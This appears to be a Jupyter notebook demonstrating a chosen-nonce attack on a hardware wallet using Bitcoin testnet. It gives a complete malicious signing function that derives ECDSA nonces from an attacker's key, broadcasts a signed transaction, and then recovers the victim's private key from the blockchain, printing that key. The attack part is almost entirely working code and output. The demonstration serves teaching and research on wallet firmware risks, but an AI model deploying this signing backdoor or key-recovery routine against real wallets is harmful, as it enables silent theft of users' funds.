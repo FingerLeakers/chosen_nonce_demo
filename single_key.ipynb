{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from io import BytesIO\n",
    "\n",
    "# some elliptic curve functions from Jimmy Song's library\n",
    "from ecc import *\n",
    "from tx import *"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Hardware wallet\n",
    "Here we use a single private key and re-use the same address for change"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'mssLVsHXgm3HneBStXcZFCosPhvisZdVdc'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# this is our precious private key\n",
    "pk = PrivateKey.parse(\"cVH5H7GqUtrLE6SpU1eef6qF6ZCFfcJqVTRwhFfuT5FW23Vt7W61\")\n",
    "# and the address\n",
    "pk.address()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sending some money to our friends and sending back the rest. Here we prepare unsigned transaction that we will sign.\n",
    "\n",
    "Previous transaction: https://live.blockcypher.com/btc-testnet/tx/af21953d35be57b80cc4f8ab29087a9e96b8d66e8588ecaf8f97b1b71789e0ce/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# constructing an unsigned transaction\n",
    "\n",
    "# input\n",
    "prev_tx = bytes.fromhex(\"af21953d35be57b80cc4f8ab29087a9e96b8d66e8588ecaf8f97b1b71789e0ce\")\n",
    "prev_index = 0\n",
    "tx_in = TxIn(prev_tx, prev_index, b'', 0xffffffff)\n",
    "tx_in._script_pubkey = Tx.get_address_data(pk.address())['script_pubkey']\n",
    "tx_in._value = 500000\n",
    "tx_ins = [ tx_in ]\n",
    "\n",
    "# outputs\n",
    "tx_outs = [\n",
    "    # sending some money to 2ND7BjA2zqqq7Nk3rJDecBbpw6bL3KebbG3\n",
    "    TxOut(100000, Tx.get_address_data(\"2ND7BjA2zqqq7Nk3rJDecBbpw6bL3KebbG3\")['script_pubkey'].serialize()),\n",
    "    # change goes back to the same address\n",
    "    TxOut(390000, Tx.get_address_data(pk.address())['script_pubkey'].serialize())\n",
    "]\n",
    "\n",
    "tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Attacker puts his private key into the firmware of the hardware wallet and changes signing algorithm."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# attacker's secret key\n",
    "attacker_key = PrivateKey(0xf00dbabe)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sign_malicious(tx, input_index, private_key, atk_key=attacker_key):\n",
    "    \"\"\" malicious signing algorithm that uses deterministic nonce with attacker's key instead of ours \"\"\"\n",
    "    tx_in = tx.tx_ins[input_index]\n",
    "    # calculating hash to sign\n",
    "    z = tx.sig_hash(input_index, SIGHASH_ALL)\n",
    "\n",
    "    # generating malicious nonce\n",
    "    k = atk_key.deterministic_k(z)\n",
    "    # r is the x coordinate of the resulting point k*G\n",
    "    r = (k*G).x.num\n",
    "    # remember 1/k = pow(k, N-2, N)\n",
    "    k_inv = pow(k, N-2, N)\n",
    "    # s = (z+r*secret) / k\n",
    "    s = (z + r*private_key.secret) * k_inv % N\n",
    "    if s > N/2:\n",
    "        s = N - s\n",
    "    # signature:\n",
    "    sig = Signature(r, s)\n",
    "    \n",
    "    der = sig.der()\n",
    "    # append the hash_type to der\n",
    "    sig = der + bytes([SIGHASH_ALL])\n",
    "    # calculate the sec\n",
    "    sec = private_key.point.sec(compressed=private_key.compressed)\n",
    "    # initialize a new script with [sig, sec] as the elements\n",
    "    # change input's script_sig to new script\n",
    "    tx_in.script_sig = Script([sig, sec])\n",
    "    # return whether sig is valid using tx.verify_input\n",
    "    return tx.verify_input(input_index)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# signing transaction with malicious nonce\n",
    "sign_malicious(tx, 0, pk)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0100000001cee08917b7b1978fafec88856ed6b8969e7a0829abf8c40cb857be353d9521af000000006b48304502210095ba4188a0714f32e33ece4b9aaa12623d08a8776e76132de642f60848b2488602200880f78ea01206e585e6796324d0bd3ab4ee2dd9a04d0a389cc890a4f153bea801210242c90953666faaeb696de211594e3a69ce00b09c6f457ce227776e89b9fdd8ecffffffff02a08601000000000017a914d9dd4cfdb8bb3f7bed6668012b2f21f392691bfe8770f30500000000001976a914877c5d04279c682d6b58dce5a664e6c92126ab3688ac00000000'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# signed transaction we broadcast to the network\n",
    "tx.serialize().hex()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Broadcasted transaction: https://live.blockcypher.com/btc-testnet/tx/3d1647bf88c3a3036a10f6f9a0bd4a2015189b0d74a99bc513c505909d575dea/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attacker: private key calculation\n",
    "He knows his secret `0xf00dbabe` and monitors the blockchain for transactions that use this key to generate nonces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3d1647bf88c3a3036a10f6f9a0bd4a2015189b0d74a99bc513c505909d575dea\n",
       "version: 1\n",
       "tx_ins:\n",
       "af21953d35be57b80cc4f8ab29087a9e96b8d66e8588ecaf8f97b1b71789e0ce:0\n",
       "\n",
       "tx_outs:\n",
       "100000:1LrxjscXgV1P5nisVzN992Ujjiq9zhJ3Z5\n",
       "390000:1DMPCpCYsjc31XhqAxeBRHbYXiL1xRGdsV\n",
       "\n",
       "locktime: 0"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "tx_candidate = Tx.parse(BytesIO(bytes.fromhex(\"0100000001cee08917b7b1978fafec88856ed6b8969e7a0829abf8c40cb857be353d9521af000000006b48304502210095ba4188a0714f32e33ece4b9aaa12623d08a8776e76132de642f60848b2488602200880f78ea01206e585e6796324d0bd3ab4ee2dd9a04d0a389cc890a4f153bea801210242c90953666faaeb696de211594e3a69ce00b09c6f457ce227776e89b9fdd8ecffffffff02a08601000000000017a914d9dd4cfdb8bb3f7bed6668012b2f21f392691bfe8770f30500000000001976a914877c5d04279c682d6b58dce5a664e6c92126ab3688ac00000000\")))\n",
    "tx_candidate"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We check if the attacker's key was used to generate nonce:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Yey! We know the nonce!\n"
     ]
    }
   ],
   "source": [
    "# parsing the signature from tx_input and removing last SIGHASH_ALL flag\n",
    "sig_candidate = Signature.parse(tx_candidate.tx_ins[0].script_sig.elements[0][:-1])\n",
    "# public key from script sig:\n",
    "pubkey_sec = tx_candidate.tx_ins[0].script_sig.elements[1]\n",
    "# calculating what r should be for this transaction. Everything is available from the blockchain.\n",
    "tx_in = tx_candidate.tx_ins[0]\n",
    "tx_in._script_pubkey = Tx.get_address_data(\"mssLVsHXgm3HneBStXcZFCosPhvisZdVdc\")['script_pubkey']\n",
    "tx_in._value = 500000\n",
    "z = tx_candidate.sig_hash(0, SIGHASH_ALL)\n",
    "k = attacker_key.deterministic_k(z)\n",
    "if (k*G).x.num == sig_candidate.r:\n",
    "    print(\"Yey! We know the nonce!\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can extract the private key from this transaction. \n",
    "\n",
    "`pk = (s*k - h)/r`\n",
    "\n",
    "There are two options for s in the equation: s and N-s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cVH5H7GqUtrLE6SpU1eef6qF6ZCFfcJqVTRwhFfuT5FW23Vt7W61\n"
     ]
    }
   ],
   "source": [
    "r_inv = pow(sig_candidate.r, N-2, N)\n",
    "secret1 = (sig_candidate.s * k - z)*r_inv % N\n",
    "secret2 = ((N-sig_candidate.s) * k - z)*r_inv % N\n",
    "# corresponding private keys\n",
    "pk1 = PrivateKey(secret1, compressed=True, testnet=True)\n",
    "pk2 = PrivateKey(secret2, compressed=True, testnet=True)\n",
    "# we can check which one is correct by comparing with the public key in the script sig:\n",
    "for pkX in [pk1, pk2]:\n",
    "    if pkX.point.sec(compressed=True) == pubkey_sec:\n",
    "        print(pkX.wif())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is indeed our private key:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'cVH5H7GqUtrLE6SpU1eef6qF6ZCFfcJqVTRwhFfuT5FW23Vt7W61'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pk.wif()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
